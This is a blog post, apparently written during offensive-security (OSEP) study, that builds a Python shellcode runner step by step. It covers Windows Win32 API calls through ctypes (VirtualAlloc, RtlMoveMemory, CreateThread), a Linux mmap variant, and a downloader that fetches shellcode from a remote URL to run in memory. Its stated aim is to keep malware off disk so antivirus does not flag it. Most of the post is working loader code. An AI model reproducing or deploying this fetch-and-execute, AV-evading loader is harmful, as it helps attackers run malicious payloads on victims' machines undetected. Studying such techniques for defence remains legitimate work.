---
title: "Simple Shellcode Runner in Python3"
date: 2021-11-22
draft: false
---

# Introduction
I'm going to be discussing executing shellcode in Python. A shellcode runner is a tool that executes shellcode in memory. This technique enables us to avoid downloading malware to the hard drive, which might be flagged by AV software.

We can use the native windows operating system API to execute shellcode in memory. This is also known as Win32 API. These APIs were designed to be used with C and uses C data types, however, they can be invoked in other languages.

# Approach 
We will use three APIs from the kernel32 DLL:
- VirtualAlloc
- RtlMoveMemory
- CreateThread

*VirtualAlloc* will be used to allocate unmanaged memory in the calling process. Then we will copy our shellcode into the allocated memory with *RtlMoveMemory* and create a new thread with *CreateThread* to execute the shellcode.

# Calling Win32 API in Python
We will use [ctypes](https://docs.python.org/3/library/ctypes.html) to interact with the win32 apis in python. 

We will take a look at each API one at a time. First let's load the kernel32.dll.

`kernel32 = ctypes.windll.kernel32`

## VirtualAlloc
The prototype for VirtualAlloc is like this:

```c
LPVOID VirtualAlloc(
LPVOID lpAddress,
SIZE_T dwSize,
DWORD flAllocationType,
DWORD flProtect );
```

- lpAddress is the memory allocation address. The documentations suggest we set it to 0 to allow the API to choose the location.
- dwSize indicates the size of the allocation. In this case we'll use the size of the shellcode array.
- flAllocationType and flProtect indicates the allocation type and memory protection. We will use 0x3000 for the allocation type which will call VirtualAlloc with MEM_RESERVE and MEM_COMMIT. 0x40 indicates that the memory is readable, writable, and executable.

Let's look at the python code:
```
shellcode = <shellcode here>
length = len(shellcode)
kernel32.VirtualAlloc.restype = ctypes.c_void_p

ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
```
 
 By default, functions will return the c int type. We can use restype to use other return types.
 
 Now that we have allocated memory, we must copy the shellcode into this memory location.
 
 ## RtlMoveMemory
 The prototype for RtlMoveMemory looks like this:

 ```c
 VOID RtlMoveMemory(
 _Out_       VOID UNALIGNED *Destination,
 _In_  const VOID UNALIGNED *Source,
 _In_        SIZE_T         Length );
 ```
 
 - Destination is the pointer to the memory block to write to.
 - Source is the pointer to the source memory block to copy from.
 - Length is the number of bytes to copy from source to destination.

In Python:
```
buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)

kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

kernel32.RtlMoveMemory(ptr, buf, length)
```

The destination pointer is pointing to the allocated buffer which is already a memory pointer so we just pass it as is. 

For the source buffer, we need to get the address of the shellcode. 

Now that we have copied our payload into the executable buffer, we can now execute it with CreateThread.

## CreateThread
The prototype for CreateThread:

```c
HANDLE CreateThread(
LPSECURITY_ATTRIBUTES lpThreadAttributes,
SIZE_T dwStackSize,
LPTHREAD_START_ROUTINE lpStartAddress,
LPVOID lpParameter,
DWORD dwCreationFlags,
LPDWORD lpThreadId );
```

- lpThreadAttributes and dwStackSize specifies thread settings and we will set it to 0 because we will not need them.
- lpStartAddress is the start address for our code execution. We will use the address of our shellcode buffer
- lpParameter is a pointer to the arguments at the start of our starting address. We will not be using this.

Python:
`ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))`

We will also use WaitForSingleObject() to wait until the thread exits.

`ctypes.windll.kernel32.WaitForSingleObject(ht, -1)`


However, this will only work on windows because we need the ctypes windll library. We can use python in mmap to execute our shellcode in memory on linux.


# mmap - linux
We will use [python's mmap](https://docs.python.org/3/library/mmap.html) to execute our shellcode in memory on linux.

First we need to allocate memory and set the proper memory allocation and protection.

```python
mm = mmap.mmap(

 -1,

 mmap.PAGESIZE,

 mmap.MAP_SHARED,

 mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,

 )
```

We'll write the shellcode to the allocated memory using mmap's write method.
`mm.write(shellcode)`

Now we need to get the address of the mmap memory. We'll use ctypes from_buffer() for this.
`ptr = ctypes.c_int.from_buffer(mm)`

Then all we need to do is create the function and call it to execute the shellcode.

```
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)

fn = functype(ptr)

fn()
```


# Downloading Shellcode
Now that we are able to execute shellcode in memory in windows and linux, we need to create a function to download our shellcode remotely instead of hardcoding our shellcode. We can use urllib.request to do so.

```
def downloader(shellcode_url):

 with urllib.request.urlopen(shellcode_url) as f:

 print("[+] Downloading shellcode...")

 time.sleep(3)

 data = f.read()

 shellcode = bytearray(data)

 str1 = shellcode.decode('unicode_escape').encode("raw_unicode_escape")

 file_size = len(str1)

 print("[+] %s Bytes Downloaded!" % (file_size))

 return str1
 ```
 
 We start by downloading the shellcode from the url and reading the file. We then converting the data into a bytearray and return the bytearray.
 
 # Closing Notes
 This is a very simple shellcode runner implemented in python. There are other functionalities that can be added to this and I will work on that as I learn these materials in OSEP. The link to the source code can be found on my github https://github.com/momo1239/buffshark-shellcode-runner
 